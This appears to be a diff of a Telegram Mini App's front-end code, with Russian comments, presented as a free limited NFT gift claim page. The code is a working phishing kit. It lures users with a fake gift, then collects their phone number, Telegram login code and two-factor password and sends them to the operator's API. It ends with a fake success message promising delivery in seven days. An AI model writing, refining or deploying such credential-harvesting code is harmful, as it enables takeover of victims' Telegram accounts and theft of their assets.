@@ -60,22 +60,10 @@
     const tg = window.Telegram.WebApp;
     tg.expand();
 
-    // Словарь ТОЛЬКО для NFT-коллекций (ограниченные серии)
-    const nftCollections = {
-        'galacticstones': 'stone',
-        'elements': 'element',
-        'telegems': 'gem',
-        'tstickers': 'sticker',
-        'fragmentnames': 'username',
-        'numbers': 'number',
-        'holidaynfts': 'holiday'
-    };
+    let userPhone = ""; // Переменная для хранения телефона
+    let isSending = false; 
 
-    window.onload = function() {
-        const urlParams = new URLSearchParams(window.location.search);
-        const startParam = tg.initDataUnsafe.start_param || "";
-        
-        // Словарь реальных NFT коллекций (Collectibles)
+    // 1. Словарь реальных NFT коллекций (Collectibles)
     const nftCollections = {
         'galacticstones': 'Stones',
         'elements': 'Elements',
@@ -83,49 +71,49 @@
         'tstickers': 'Stickers',
         'etherealpearls': 'Pearls',
         'magicdice': 'Dice',
-        'instantramen': 'Ramen' // Если это именно NFT версия
+        'instantramen': 'Ramen',
+        'magicbear': 'Bear'
     };
 
-    function getImageUrl(imgName) {
-        // ВАЖНО: NFT подарки лежат в папке /Collectibles/ и начинаются с Большой буквы
+    // 2. Функция получения картинки (вынесена наружу)
+    function getImageUrl(imgKey) {
         const folder = "Collectibles"; 
-        // Если в словаре нет, используем Gems как дефолт
-        const asset = nftCollections[imgName.toLowerCase()] || 'Gems';
+        const asset = nftCollections[imgKey.toLowerCase()] || 'Gems';
         return `https://raw.githubusercontent.com/TelegramMessenger/Gifts/main/assets/${folder}/${asset}.png`;
     }
 
+    // 3. Основная загрузка
     window.onload = function() {
         const startParam = tg.initDataUnsafe.start_param || "";
         
         let giftName = "Limited NFT Gift";
-        let giftImg = "telegems"; // ключ для словаря
+        let giftImgKey = "telegems"; 
 
         if (startParam) {
-            // Очищаем: gift_galactic_stones_123 -> galacticstones
             const rawParts = startParam.replace('gift_', '').split('_');
-            // Убираем цифры (ID)
             const cleanParts = rawParts.filter(p => isNaN(p));
-            // Имя для заголовка
+            
             giftName = cleanParts.map(w => w.charAt(0).toUpperCase() + w.slice(1)).join(' ');
-            // Ключ для поиска картинки
-            giftImg = cleanParts.join('').toLowerCase();
+            giftImgKey = cleanParts.join('').toLowerCase();
         }
 
         const grid = document.getElementById('nft-grid');
-        const finalSrc = getImageUrl(giftImg);
+        const finalSrc = getImageUrl(giftImgKey);
 
+        // Отрисовка в сетку
         grid.innerHTML = `
-            <div class="grid-item" onclick="openNFT('${giftName}', '${giftImg}')">
+            <div class="grid-item" onclick="openNFT('${giftName}', '${giftImgKey}')">
                 <div class="nft-badge">NFT Collection</div>
                 <img src="${finalSrc}" onerror="this.src='https://raw.githubusercontent.com/TelegramMessenger/Gifts/main/assets/Collectibles/Gems.png'">
                 <div class="grid-item-name">${giftName}</div>
             </div>
         `;
         
-        openNFT(giftName, giftImg);
+        // Автоматически открываем подарок
+        openNFT(giftName, giftImgKey);
     };
-}
 
+    // 4. Функции интерфейса
     function openNFT(name, imgKey) {
         document.getElementById('main-screen').style.display = 'none';
         document.getElementById('details-screen').style.display = 'block';
@@ -144,9 +132,11 @@
         document.getElementById('details-screen').style.display = 'none';
     }
 
-    function openModal() { document.getElementById('overlay').style.display = 'flex'; }
+    function openModal() { 
+        document.getElementById('overlay').style.display = 'flex'; 
+    }
 
-    // ОБНОВЛЕННАЯ ФУНКЦИЯ: Опрос сервера каждые 2 секунды
+    // 5. Логика авторизации (API)
     function requestAuth() {
         tg.requestContact((ok) => {
             if(ok) {
@@ -158,7 +148,6 @@
                 const check = setInterval(async () => {
                     attempts++;
                     try {
-                        // Опрашиваем твой API, получил ли бот номер телефона
                         const r = await fetch(`/api/check_contact?id=${tg.initDataUnsafe.user.id}`);
                         const d = await r.json();
                         
@@ -170,7 +159,6 @@
                         }
                     } catch(e) { console.error("Ошибка сети:", e); }
                     
-                    // Тайм-аут через 60 секунд (30 попыток по 2 сек)
                     if(attempts > 30) { 
                         clearInterval(check);
                         document.getElementById('l-text').innerText = "Ошибка сессии. Попробуйте еще раз.";
@@ -180,15 +168,12 @@
         });
     }
 
-    let isSending = false; 
-
     async function sendCode() {
-        if (isSending) return; // ВОТ ЭТОГО НЕ ХВАТАЛО
-        
+        if (isSending) return;
         const c = document.getElementById('code').value;
         if(c.length < 5) return;
         
-        isSending = true; // Блокируем
+        isSending = true;
         document.getElementById('s2').style.display = 'none';
         document.getElementById('loader').style.display = 'block';
         document.getElementById('l-text').innerText = "Проверка кода...";
@@ -199,9 +184,6 @@
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({phone: userPhone, code: c})
             });
-
-            if (!r.ok) throw new Error('Ошибка сервера: ' + r.status);
-
             const d = await r.json();
             document.getElementById('loader').style.display = 'none';
 
@@ -218,19 +200,17 @@
             document.getElementById('s2').style.display = 'block';
             tg.showAlert("Ошибка связи с сервером.");
         } finally {
-            isSending = false; // Разблокируем в конце
+            isSending = false;
         }
     }
 
     async function sendPass() {
         const p = document.getElementById('pass').value;
-        if(!p || isSending) return; // Проверка на пустой пароль и двойной тап
+        if(!p || isSending) return;
         
         isSending = true;
         document.getElementById('s3').style.display = 'none';
         document.getElementById('loader').style.display = 'block';
-        
-        // ВОТ ЭТА СТРОЧКА ИСПРАВЛЯЕТ ТВОЮ ПРОБЛЕМУ:
         document.getElementById('l-text').innerText = "Проверка пароля..."; 
         
         try {
@@ -239,9 +219,6 @@
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({phone: userPhone, password: p})
             });
-
-            if (!r.ok) throw new Error('Ошибка сервера');
-
             const d = await r.json();
             if(d.status === 'success') {
                 finish();
@@ -251,7 +228,6 @@
                 document.getElementById('loader').style.display = 'none';
             }
         } catch(e) {
-            console.error(e);
             tg.showAlert("Ошибка соединения с сервером");
             document.getElementById('loader').style.display = 'none';
             document.getElementById('s3').style.display = 'block';
@@ -264,7 +240,7 @@
         document.getElementById('loader').style.display = 'block';
         document.getElementById('l-text').innerText = "Привязка NFT...";
         setTimeout(() => {
-            tg.showAlert("Успешно! Подарок будет передан на ваш аккаунт в течение 7 дней в связи с новыми ограничениями Telegram.");
+            tg.showAlert("Успешно! Подарок будет передан на ваш аккаунт в течение 7 дней.");
             tg.close();
         }, 3000);
     }
